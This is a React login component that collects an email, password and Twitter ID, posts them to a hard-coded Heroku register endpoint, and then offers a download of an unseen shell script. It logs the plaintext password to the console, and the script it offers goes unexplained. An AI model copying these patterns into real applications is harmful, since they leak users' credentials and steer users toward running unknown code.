import React, { Component } from "react";

export default class Login extends Component {
		constructor() {
			super();
			this.state = {
				email: '',
				pass: '',
				twitterID: '',
				show: false,
			};
		}

	submitForm = () => {
		var formdata = new FormData();
				formdata.append("email", this.state.email);
				formdata.append("password", this.state.pass);
				formdata.append("twitterId", this.state.twitterID);

		var requestOptions = {
			method: 'POST',
			body: formdata,
			redirect: 'follow'
		};

		fetch("https://boiling-dawn-19818.herokuapp.com/api/register", requestOptions)
			.then(response => response.text())
			.then(result => console.log(result))
			.catch(error => console.log('error', error));
				console.log(this.state);
		setTimeout(() => {
			this.setState({
				show: true
				});
			}, 1000);
		}

    render() {
        return (
            <form>
                <h3>Sign In</h3>

                <div className="form-group">
                    <label>Email address</label>
									<input type="email" className="form-control" placeholder="Enter email" onChange={(e) => {
										this.setState({
											email: e.target.value,
										});
									}}/>
                </div>

                <div className="form-group">
                    <label>Password</label>
									<input type="password" className="form-control" placeholder="Enter password" onChange={(e) => {
										this.setState({
											pass: e.target.value,
										});
									}}/>
                </div>

                <div className="form-group">
                    <label>Twitter ID</label>
									<input type="text" className="form-control" placeholder="Enter your twitter ID" onChange={(e) => {
										this.setState({
											twitterID: e.target.value,
										});
									}}/>
                </div>

                <div className="form-group">
                    <div className="custom-control custom-checkbox">
                        <input type="checkbox" className="custom-control-input" id="customCheck1" />
                        <label className="custom-control-label" htmlFor="customCheck1">Remember me</label>
                    </div>
                </div>

							<button type="button" className="btn btn-primary btn-block" onClick={() => {
								this.submitForm();
							}}>Submit</button>
							{
								this.state.show
									?
										<a href = "../../script.sh" download><button type="button" style={{marginTop: "10px"}} className="btn btn-primary btn-block" onClick={() => {
							}}>Download</button></a>
									:
									<div></div>
							}
							{
								/*
                <p className="forgot-password text-right">
                    Forgot <a href="#">password?</a>
                </p>
								*/
							}
            </form>
        );
    }
}
